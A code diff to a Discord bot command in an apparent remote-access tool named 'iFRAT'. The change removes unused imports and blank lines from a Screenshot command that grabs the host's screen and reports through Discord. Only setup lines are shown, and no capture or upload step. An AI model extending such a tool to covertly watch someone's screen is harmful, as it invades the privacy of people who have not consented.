@@ -1,20 +1,14 @@
 using System.Drawing;
 
 using Discord;
-using Discord.Interactions;
-using Discord.Rest;
 using Discord.WebSocket;
-using Emgu.CV.Reg;
 
-using iFRAT.Extensions;
 using iFRAT.Extra;
-
-using Masked.DiscordNet.Extensions;
-using Spectre.Console;
 
 namespace iFRAT.Commands;
 
 #pragma warning disable MA0004 // Disable -> Use ConfigurateAwait(false); as no SyncCtx is needed.
+
 /// <summary>
 /// The Screenshot Command. Allows to take an image of what the screen has at the moment.
 /// </summary>
@@ -26,7 +20,6 @@ public sealed class Screenshot : Masked.DiscordNet.IDiscordCommand
     {
         await sockCommand.DeferAsync();
         var response = await sockCommand.FollowupAsync("Obtaining screnshot");
-
 
         var screenSize = ScreenHelpers.GetVirtualDisplaySize();
         _ = await response.ReplyAsync("Obtained Screen Size");
